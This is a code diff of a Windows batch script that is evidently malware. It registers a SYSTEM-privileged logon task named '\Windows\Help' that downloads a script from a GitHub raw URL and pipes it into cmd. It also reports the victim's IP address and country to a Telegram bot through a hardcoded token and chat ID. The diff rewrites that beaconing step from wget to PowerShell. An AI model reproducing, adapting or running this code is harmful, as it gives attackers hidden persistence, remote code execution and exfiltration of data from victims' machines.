@@ -19,18 +19,16 @@ for %a in (%processList%) do (
 )
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /Q /V:ON" /F
 
-if exist "%ProgramData%\ssh\sent" exit /b
-chcp 65001 >nul
+if exist "%ProgramData%\sent" exit /b
+chcp 65001 > nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
 set "CHAT_ID=-4955395962"
-set "IP=No IP"
-set "Country=No Country"
 
-for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
-    if not "%a"=="" set "Country=%a"
-    if not "%b"=="" set "IP=%b"
+for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($j.query + '|' + $j.country) } catch { Write-Host 'No IP|No Country' }"') do (
+    set "IP=%a"
+    set "Country=%b"
 )
 
-%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=ADIL%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
-echo done > "%ProgramData%\ssh\sent"
+powershell -NoProfile -Command "$msg = 'ADIL' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
+echo done > "%ProgramData%\sent"
 endlocal
